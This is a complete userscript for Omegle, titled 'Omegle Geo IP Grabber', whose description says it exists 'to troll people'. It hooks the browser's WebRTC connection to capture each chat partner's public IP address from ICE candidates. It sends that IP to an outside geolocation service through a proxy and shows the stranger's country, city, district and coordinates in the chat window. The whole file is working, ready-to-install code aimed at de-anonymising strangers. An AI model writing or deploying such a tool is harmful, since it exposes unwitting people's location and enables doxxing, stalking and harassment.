// ==UserScript==
// @name         Omegle Geo IP Grabber
// @namespace    https://flawcra.cc
// @version      1.0.7-GitHub
// @description  A simple script to troll people on Omegle.
// @author       FlawCra
// @license      Apache License 2.0
// @match        https://www.omegle.com/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    window.oRTCPeerConnection =
        window.oRTCPeerConnection || window.RTCPeerConnection;

    window.RTCPeerConnection = function (...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function (iceCandidate, ...rest) {
            const fields = iceCandidate.candidate.split(" ");

            console.log(iceCandidate.candidate);
            const ip = fields[4];
            if (fields[7] === "srflx") {
                getLocation(ip);
            }
            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };
        return pc;
    };

    var getLocation = async (ip) => {
        let url = "https://cors.flawcra.cc/?"+`https://ipl.flawcra.cc/${ip}`;

        await fetch(url).then((response) =>
                              response.json().then((json) => {
            const output = `
---------------------
IP: ${ip}
Country: ${json.country_name}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
---------------------
`;
            addMessage(output);
        })
                             );
    };

    var addMessage = async (msg) => {
        var logbox = document.getElementsByClassName("logbox")[0].firstChild;
        var div = document.createElement("div");
        div.setAttribute("class","logitem")
        var p = document.createElement("p");
        p.setAttribute("class","statuslog");
        p.innerText = msg;
        div.appendChild(p);
        logbox.appendChild(div);
    };
})();
